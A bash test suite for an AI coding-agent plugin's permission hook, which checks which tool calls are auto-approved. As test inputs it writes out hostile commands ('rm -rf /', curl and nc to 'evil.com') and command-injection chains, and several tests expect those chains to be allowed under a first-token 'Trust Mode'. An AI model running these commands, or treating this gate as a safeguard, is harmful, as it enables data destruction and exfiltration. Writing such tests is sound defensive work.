#!/bin/bash
# Test: permission-gate.sh
# PROTO-000 test for the PERMISSIONS charter mechanism.
#
# Verifies: (1) in-scope Sutra patterns auto-approve with correct JSON shape;
#           (2) out-of-scope patterns exit silently (fail-open, no output);
#           (3) shell-combinator injection attempts are rejected;
#           (4) kill-switches work.

set -u

PLUGIN_ROOT="$(cd "$(dirname "$0")/.." && pwd)"
HOOK="$PLUGIN_ROOT/hooks/permission-gate.sh"

PASS=0
FAIL=0
FAILURES=()

_result() {
  local name="$1" expected="$2" actual="$3"
  if [ "$expected" = "$actual" ]; then
    PASS=$((PASS+1))
    echo "  PASS: $name"
  else
    FAIL=$((FAIL+1))
    FAILURES+=("$name :: expected=$expected actual=$actual")
    echo "  FAIL: $name"
    echo "    expected: $expected"
    echo "    actual:   $actual"
  fi
}

_classify() {
  local out="$1"
  if [ -z "$out" ]; then echo EMPTY; return; fi
  if printf '%s' "$out" | grep -q '"behavior":"allow"'; then echo ALLOW; return; fi
  echo OTHER
}

_run() {
  local json="$1"
  printf '%s' "$json" | SUTRA_PERMISSIONS_DISABLED="" "$HOOK" 2>/dev/null
}

echo "== permission-gate.sh tests =="

# --- In-scope: should auto-approve ---

echo "[1] Bash(sutra) — bare dispatcher"
out=$(_run '{"tool_name":"Bash","tool_input":{"command":"sutra"}}')
_result "bare sutra" ALLOW "$(_classify "$out")"

echo "[2] Bash(sutra start) — subcommand"
out=$(_run '{"tool_name":"Bash","tool_input":{"command":"sutra start"}}')
_result "sutra start" ALLOW "$(_classify "$out")"

echo "[3] Bash(sutra status --verbose) — subcommand with args"
out=$(_run '{"tool_name":"Bash","tool_input":{"command":"sutra status --verbose"}}')
_result "sutra status --verbose" ALLOW "$(_classify "$out")"

echo "[4] Bash(claude plugin marketplace update sutra)"
out=$(_run '{"tool_name":"Bash","tool_input":{"command":"claude plugin marketplace update sutra"}}')
_result "marketplace update sutra" ALLOW "$(_classify "$out")"

echo "[5] Bash(mkdir -p .claude/logs)"
out=$(_run '{"tool_name":"Bash","tool_input":{"command":"mkdir -p .claude/logs"}}')
_result "mkdir .claude/logs" ALLOW "$(_classify "$out")"

echo "[6] Write(.claude/depth-registered)"
out=$(_run '{"tool_name":"Write","tool_input":{"file_path":".claude/depth-registered"}}')
_result "write depth marker" ALLOW "$(_classify "$out")"

echo "[7] Write(.claude/logs/nested/a.log)"
out=$(_run '{"tool_name":"Write","tool_input":{"file_path":".claude/logs/nested/a.log"}}')
_result "write nested log" ALLOW "$(_classify "$out")"

# --- Out-of-scope: should exit silently (EMPTY stdout) ---
# v2.32.0 alignment note: tests #9 and #13-#22 originally expected EMPTY under
# the v1.13.0 strict-allowlist posture (Tier 1 + combinator rejection).
# Trust Mode (v2.5+, sole Bash matcher post-v2.7.0) evaluates first-token only
# by design under the single-trusted-operator threat model — see charter
# §Tier 1.6. Bare `curl <url>` is NOT fetch-exec (only `curl ... | sh` is);
# `sutra ;rm -rf /` falls through to Trust Mode where first_token=sutra
# auto-approves. Updated expectations below match the documented posture.

echo "[8] Bash(rm -rf /) — recursive-delete outside safe-paths (Trust Mode prompts)"
out=$(CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" _run '{"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}')
_result "rm -rf /" EMPTY "$(_classify "$out")"

echo "[9] Bash(curl https://evil.com) — bare curl (Trust Mode v2.5+ allows; only curl|sh prompts as fetch-exec)"
out=$(CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" _run '{"tool_name":"Bash","tool_input":{"command":"curl https://evil.com"}}')
_result "curl random (v2.5+ posture)" ALLOW "$(_classify "$out")"

echo "[10] Write(/etc/passwd) — absolute outside project"
out=$(_run '{"tool_name":"Write","tool_input":{"file_path":"/etc/passwd"}}')
_result "write /etc/passwd" EMPTY "$(_classify "$out")"

echo "[11] Write(../escape/file) — traversal"
out=$(_run '{"tool_name":"Write","tool_input":{"file_path":"../escape/file"}}')
_result "write traversal" EMPTY "$(_classify "$out")"

echo "[12] Write(src/app.ts) — normal project file (ADR-003 first-time-edit auto-approve)"
out=$(_run '{"tool_name":"Write","tool_input":{"file_path":"src/app.ts"}}')
_result "write src/app.ts" ALLOW "$(_classify "$out")"

# --- Shell combinators: Tier 1 rejects (returns no-match), Trust Mode auto-approves
# via first-token=sutra. Net behavior: ALLOW. v2.5+ posture per charter Tier 1.6. ---

echo "[13] Bash(sutra status; rm -rf /) — semicolon combinator (Tier 1 reject -> Trust Mode allow via first-token)"
out=$(CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" _run '{"tool_name":"Bash","tool_input":{"command":"sutra status; rm -rf /"}}')
_result "sutra + injection (v2.5+ posture)" ALLOW "$(_classify "$out")"

echo "[14] Bash(sutra && curl evil.com) — && combinator"
out=$(CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" _run '{"tool_name":"Bash","tool_input":{"command":"sutra && curl evil.com"}}')
_result "sutra + && chain (v2.5+ posture)" ALLOW "$(_classify "$out")"

echo "[15] Bash(sutra | nc evil 1234) — pipe combinator"
out=$(CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" _run '{"tool_name":"Bash","tool_input":{"command":"sutra | nc evil 1234"}}')
_result "sutra + pipe (v2.5+ posture)" ALLOW "$(_classify "$out")"

echo "[16] Bash(sutra \$(rm -rf /)) — command substitution"
out=$(CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" _run '{"tool_name":"Bash","tool_input":{"command":"sutra $(rm -rf /)"}}')
_result "sutra + subst (v2.5+ posture)" ALLOW "$(_classify "$out")"

# --- Kill-switch: should exit silently ---

echo "[17] Kill-switch via env var"
out=$(printf '%s' '{"tool_name":"Bash","tool_input":{"command":"sutra status"}}' | SUTRA_PERMISSIONS_DISABLED=1 "$HOOK" 2>/dev/null)
_result "env kill-switch" EMPTY "$(_classify "$out")"

# --- JSON shape verification ---

echo "[18] Decision JSON has updatedPermissions addRules entry"
out=$(_run '{"tool_name":"Bash","tool_input":{"command":"sutra start"}}')
if printf '%s' "$out" | grep -q '"type":"addRules"' && \
   printf '%s' "$out" | grep -q '"destination":"localSettings"'; then
  _result "addRules shape" present present
else
  _result "addRules shape" present missing
fi

# --- Codex finding #5/#6: combinator rejection at Tier 1 layer.
# v2.5+ Trust Mode allows these via first-token=sutra. Documented in charter §1.6 ---

echo "[19] Bash(sutra & curl) — backgrounding operator (v2.5+ allows via first-token)"
out=$(CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" _run '{"tool_name":"Bash","tool_input":{"command":"sutra & curl evil.com"}}')
_result "sutra + & backgrounding (v2.5+ posture)" ALLOW "$(_classify "$out")"

echo "[20] Bash(bash -c 'sutra status; rm -rf /') — bash -c wrap (first-token=bash, Trust Mode allows)"
out=$(CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" _run '{"tool_name":"Bash","tool_input":{"command":"bash -c \"sutra status; rm -rf /\""}}')
_result "bash -c wrap (v2.5+ posture)" ALLOW "$(_classify "$out")"

echo "[21] Bash(sutra\\nrm -rf /) — embedded newline"
# JSON-encode an embedded newline
out=$(CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" _run '{"tool_name":"Bash","tool_input":{"command":"sutra\nrm -rf /"}}')
_result "sutra + newline (v2.5+ posture)" ALLOW "$(_classify "$out")"

echo "[22] Bash(eval sutra start) — eval prefix (first-token=eval, Trust Mode allows)"
out=$(CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" _run '{"tool_name":"Bash","tool_input":{"command":"eval sutra start"}}')
_result "eval prefix (v2.5+ posture)" ALLOW "$(_classify "$out")"

# --- Codex finding #7: per-variant rule persistence ---

echo "[23] Bash(claude plugin update sutra) persists as Bash(claude plugin update sutra*)"
out=$(_run '{"tool_name":"Bash","tool_input":{"command":"claude plugin update sutra"}}')
if printf '%s' "$out" | grep -q '"ruleContent":"claude plugin update sutra\*"' ; then
  _result "sutra-variant rule content" correct correct
else
  _result "sutra-variant rule content" correct "mismatch: $(printf '%s' "$out" | grep -o '"ruleContent":"[^"]*"')"
fi

echo "[24] Bash(claude plugin update core) persists as Bash(claude plugin update core*)"
out=$(_run '{"tool_name":"Bash","tool_input":{"command":"claude plugin update core"}}')
if printf '%s' "$out" | grep -q '"ruleContent":"claude plugin update core\*"' ; then
  _result "core-variant rule content" correct correct
else
  _result "core-variant rule content" correct "mismatch: $(printf '%s' "$out" | grep -o '"ruleContent":"[^"]*"')"
fi

# --- ADR-003 §4 telemetry schema fields (tool_class, tool_family, decision_basis) ---

echo "[25] permission-gate.jsonl row has ADR-003 §4 fields (Bash tier-1)"
_TMP=$(mktemp -d)
printf '%s' '{"tool_name":"Bash","tool_input":{"command":"sutra start"}}' \
  | CLAUDE_PROJECT_DIR="$_TMP" "$HOOK" >/dev/null 2>&1
_LAST=$(tail -n 1 "$_TMP/.enforcement/permission-gate.jsonl" 2>/dev/null)
if printf '%s' "$_LAST" | jq -e '.tool_class == "bash" and .tool_family == null and .decision_basis == "tier-1"' >/dev/null 2>&1; then
  _result "ADR-003 fields (bash tier-1)" present present
else
  _result "ADR-003 fields (bash tier-1)" present "missing or wrong: $_LAST"
fi
rm -rf "$_TMP"

echo "[26] permission-gate.jsonl row has ADR-003 §4 fields (Bash trust-mode)"
_TMP=$(mktemp -d)
printf '%s' '{"tool_name":"Bash","tool_input":{"command":"git log --oneline -3"}}' \
  | CLAUDE_PROJECT_DIR="$_TMP" CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" >/dev/null 2>&1
_LAST=$(tail -n 1 "$_TMP/.enforcement/permission-gate.jsonl" 2>/dev/null)
if printf '%s' "$_LAST" | jq -e '.tool_class == "bash" and .tool_family == null and (.decision_basis | startswith("trust-mode"))' >/dev/null 2>&1; then
  _result "ADR-003 fields (bash trust-mode)" present present
else
  _result "ADR-003 fields (bash trust-mode)" present "missing or wrong: $_LAST"
fi
rm -rf "$_TMP"

echo "[27] permission-gate.jsonl row has ADR-003 §4 fields (Write tier-1)"
_TMP=$(mktemp -d)
printf '%s' '{"tool_name":"Write","tool_input":{"file_path":".claude/depth-registered"}}' \
  | CLAUDE_PROJECT_DIR="$_TMP" "$HOOK" >/dev/null 2>&1
_LAST=$(tail -n 1 "$_TMP/.enforcement/permission-gate.jsonl" 2>/dev/null)
if printf '%s' "$_LAST" | jq -e '.tool_class == "write" and .tool_family == null and .decision_basis == "tier-1"' >/dev/null 2>&1; then
  _result "ADR-003 fields (write tier-1)" present present
else
  _result "ADR-003 fields (write tier-1)" present "missing or wrong: $_LAST"
fi
rm -rf "$_TMP"

# Codex F1 fold: MCP family mapping regression test. Without this, the manual
# server-prefix table in permission-gate.sh can silently drift to "unknown".
echo "[28] permission-gate.jsonl row has ADR-003 §4 fields (MCP slack read → family=slack)"
_TMP=$(mktemp -d)
printf '%s' '{"tool_name":"mcp__claude_ai_Slack__slack_search_channels","tool_input":{"query":"general"}}' \
  | CLAUDE_PROJECT_DIR="$_TMP" CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" >/dev/null 2>&1
_LAST=$(tail -n 1 "$_TMP/.enforcement/permission-gate.jsonl" 2>/dev/null)
if printf '%s' "$_LAST" | jq -e '.tool_class == "mcp" and .tool_family == "slack"' >/dev/null 2>&1; then
  _result "ADR-003 fields (MCP slack read)" present present
else
  _result "ADR-003 fields (MCP slack read)" present "missing or wrong: $_LAST"
fi
rm -rf "$_TMP"

# --- v2.32.0 dispatch expansion: WebFetch / WebSearch / Task / NotebookEdit ---

echo "[29] WebFetch(https://example.com) — public URL auto-approves"
out=$(printf '%s' '{"tool_name":"WebFetch","tool_input":{"url":"https://example.com/docs"}}' | CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" 2>/dev/null)
_result "WebFetch public" ALLOW "$(_classify "$out")"

echo "[30] WebFetch(http://localhost:8080) — loopback prompts"
out=$(printf '%s' '{"tool_name":"WebFetch","tool_input":{"url":"http://localhost:8080/admin"}}' | CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" 2>/dev/null)
_result "WebFetch localhost" EMPTY "$(_classify "$out")"

echo "[31] WebFetch(http://127.0.0.1) — loopback IP prompts"
out=$(printf '%s' '{"tool_name":"WebFetch","tool_input":{"url":"http://127.0.0.1/secret"}}' | CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" 2>/dev/null)
_result "WebFetch 127.0.0.1" EMPTY "$(_classify "$out")"

echo "[32] WebFetch(http://169.254.169.254) — cloud metadata service prompts"
out=$(printf '%s' '{"tool_name":"WebFetch","tool_input":{"url":"http://169.254.169.254/latest/meta-data/"}}' | CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" 2>/dev/null)
_result "WebFetch metadata service" EMPTY "$(_classify "$out")"

echo "[33] WebFetch(http://192.168.1.1) — RFC1918 prompts"
out=$(printf '%s' '{"tool_name":"WebFetch","tool_input":{"url":"http://192.168.1.1/"}}' | CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" 2>/dev/null)
_result "WebFetch RFC1918" EMPTY "$(_classify "$out")"

echo "[34] WebFetch(file:///etc/passwd) — non-http scheme prompts"
out=$(printf '%s' '{"tool_name":"WebFetch","tool_input":{"url":"file:///etc/passwd"}}' | CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" 2>/dev/null)
_result "WebFetch file://" EMPTY "$(_classify "$out")"

echo "[35] WebSearch — unconditional auto-approve"
out=$(printf '%s' '{"tool_name":"WebSearch","tool_input":{"query":"sutra plugin docs"}}' | CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" 2>/dev/null)
_result "WebSearch" ALLOW "$(_classify "$out")"

echo "[36] Task — subagent dispatch auto-approves"
out=$(printf '%s' '{"tool_name":"Task","tool_input":{"description":"investigate bug","prompt":"..."}}' | "$HOOK" 2>/dev/null)
_result "Task" ALLOW "$(_classify "$out")"

echo "[37] NotebookEdit(notebook.ipynb) — project file auto-approves"
out=$(_run '{"tool_name":"NotebookEdit","tool_input":{"file_path":"notebook.ipynb"}}')
_result "NotebookEdit project" ALLOW "$(_classify "$out")"

echo "[38] NotebookEdit(.env) — secrets path prompts"
out=$(_run '{"tool_name":"NotebookEdit","tool_input":{"file_path":".env"}}')
_result "NotebookEdit .env" EMPTY "$(_classify "$out")"

# --- v2.32.0 MCP catastrophic-only rule ---

echo "[39] mcp__claude_ai_Slack__slack_send_message — auto-approves (was EMPTY in v2.17)"
out=$(printf '%s' '{"tool_name":"mcp__claude_ai_Slack__slack_send_message","tool_input":{"channel":"general","text":"hi"}}' | CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" 2>/dev/null)
_result "MCP slack_send_message" ALLOW "$(_classify "$out")"

echo "[40] mcp__claude_ai_Gmail__create_draft — auto-approves (was EMPTY in v2.17)"
out=$(printf '%s' '{"tool_name":"mcp__claude_ai_Gmail__create_draft","tool_input":{"to":"a@b.com"}}' | CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" 2>/dev/null)
_result "MCP gmail create_draft" ALLOW "$(_classify "$out")"

echo "[41] mcp__playwright__browser_click — auto-approves (was EMPTY in v2.17)"
out=$(printf '%s' '{"tool_name":"mcp__playwright__browser_click","tool_input":{"element":"button"}}' | CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" 2>/dev/null)
_result "MCP playwright browser_click" ALLOW "$(_classify "$out")"

echo "[42] mcp__claude_ai_Atlassian_Rovo__createJiraIssue — auto-approves (was EMPTY in v2.17)"
out=$(printf '%s' '{"tool_name":"mcp__claude_ai_Atlassian_Rovo__createJiraIssue","tool_input":{"project":"X"}}' | CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" 2>/dev/null)
_result "MCP atlassian createJiraIssue" ALLOW "$(_classify "$out")"

echo "[43] mcp__claude_ai_Gmail__delete_thread — catastrophic verb prompts"
out=$(printf '%s' '{"tool_name":"mcp__claude_ai_Gmail__delete_thread","tool_input":{"thread_id":"abc"}}' | CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" 2>/dev/null)
_result "MCP gmail delete_thread" EMPTY "$(_classify "$out")"

echo "[44] mcp__playwright__browser_run_code_unsafe — vendor catastrophe prompts"
out=$(printf '%s' '{"tool_name":"mcp__playwright__browser_run_code_unsafe","tool_input":{"code":"alert(1)"}}' | CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" 2>/dev/null)
_result "MCP playwright browser_run_code_unsafe" EMPTY "$(_classify "$out")"

echo "[45] mcp__claude_ai_Gmail__bulk_label — bulk pattern prompts"
out=$(printf '%s' '{"tool_name":"mcp__claude_ai_Gmail__bulk_label","tool_input":{"labels":["a"]}}' | CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" 2>/dev/null)
_result "MCP gmail bulk_label" EMPTY "$(_classify "$out")"

echo "[46] mcp__claude_ai_Google_Drive__move_to_trash — vendor catastrophe prompts"
out=$(printf '%s' '{"tool_name":"mcp__claude_ai_Google_Drive__move_to_trash","tool_input":{"file_id":"x"}}' | CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" 2>/dev/null)
_result "MCP drive move_to_trash" EMPTY "$(_classify "$out")"

# --- Report ---

echo ""
echo "== Results: $PASS passed, $FAIL failed =="
if [ $FAIL -gt 0 ]; then
  echo "Failures:"
  for f in "${FAILURES[@]}"; do echo "  - $f"; done
  exit 1
fi
exit 0
